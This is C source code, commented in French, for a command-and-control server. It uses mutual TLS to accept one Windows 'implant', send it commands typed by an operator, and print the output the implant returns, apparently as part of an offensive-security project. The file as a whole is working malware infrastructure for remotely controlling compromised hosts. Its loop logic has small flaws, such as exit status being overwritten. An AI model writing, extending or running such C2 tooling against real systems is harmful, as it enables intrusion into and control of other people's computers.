/*
 * c2_server.c - C2 Server en C avec TLS mutuel (mTLS).
 *
 * Remplace le serveur Python (c2_server.py) de la phase 2.
 * Le C2 tourne sur Linux (Ubuntu). L'implant (implant.c) tourne sur Windows.
 *
 * Protocole :
 *   1. Handshake TLS (mTLS) : server + client s'authentifient mutuellement.
 *   2. Boucle interactive :
 *      a. L'opérateur tape une commande (stdin).
 *      b. Le serveur envoie la commande à l'implant via TLS.
 *      c. L'implant exécute, renvoie la sortie.
 *      d. Le serveur affiche la sortie.
 *   3. 'exit' ferme la connexion proprement.
 *
 * Compilation (Linux) :
 *   gcc -Wall -Wextra -o c2_server c2_server.c tls.c -lssl -lcrypto
 *
 * Usage :
 *   ./c2_server [ip_ecoute]   (par défaut SERVER_BIND_IP du .env, sinon 0.0.0.0)
 */

#include "tls.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE   4096
#define MAX_CMD_LEN   1024

int main(int argc, char *argv[]) {
    const char *ip;
    tls_conn   *c      = NULL;
    char        cmd[MAX_CMD_LEN];
    char        buf[BUFFER_SIZE];
    int         n;
    int         status = 1;

    cfg_load(".env");
    ip = (argc >= 2) ? argv[1] : cfg_get("SERVER_BIND_IP", "0.0.0.0");

    if (tls_init() != 0) {
        fprintf(stderr, "[C2] Init réseau impossible\n");
        return 1;
    }

    printf("[*] C2 Server — TLS/mTLS\n");
    printf("[*] Écoute sur %s:%d\n", ip, cfg_port());
    fflush(stdout);

    /* Attend et authentifie UN implant. */
    c = tls_accept_one(ip, cfg_port());
    if (!c) {
        fprintf(stderr, "[C2] Connexion TLS échouée\n");
        goto cleanup;
    }
    printf("[+] Implant connecté (%s)\n", tls_version(c));
    printf("[+] Shell interactif — 'exit' pour fermer\n\n");

    /* Boucle de commandes. */
    for (;;) {
        /* Prompt opérateur. */
        printf("[C2]> ");
        fflush(stdout);

        if (fgets(cmd, sizeof(cmd), stdin) == NULL)
            break; /* EOF / Ctrl-D */

        /* Retire le '\n' terminal. */
        size_t len = strlen(cmd);
        if (len > 0 && cmd[len - 1] == '\n')
            cmd[--len] = '\0';
        if (len == 0)
            continue; /* ligne vide : redemande */

        /* Envoie la commande à l'implant. */
        if (tls_send(c, cmd, (int)len) <= 0) {
            fprintf(stderr, "[C2] Envoi échoué\n");
            break;
        }

        /* Commande 'exit' : on attend l'ack de l'implant puis on coupe. */
        if (strcmp(cmd, "exit") == 0) {
            /* Lecture facultative de l'ack "BYE" de l'implant. */
            tls_recv(c, buf, sizeof(buf) - 1);
            printf("[*] Connexion fermée.\n");
            status = 0;
            break;
        }

        /* Réception de la sortie (potentiellement en plusieurs morceaux). */
        while ((n = tls_recv(c, buf, sizeof(buf) - 1)) > 0) {
            buf[n] = '\0';
            fputs(buf, stdout);
            fflush(stdout);

            /* L'implant signale la fin de la sortie avec le marqueur "\x00END". */
            if (n >= 4 && memcmp(buf + n - 4, "\x00END", 4) == 0) {
                /* Efface le marqueur de l'affichage. */
                break;
            }
            /* Si SSL_read revient avec moins que le buffer, on a tout reçu
             * (dans la grande majorité des cas pour une réponse courte).
             * Pour les longues sorties, l'implant envoie le marqueur. */
            if (n < sizeof(buf) - 1)
                break;
        }
        if (n <= 0 && !(n == 0)) {
            fprintf(stderr, "[C2] Implant déconnecté\n");
            break;
        }
        printf("\n");
    }
    status = 0;

cleanup:
    tls_close(c);
    tls_cleanup();
    return status;
}
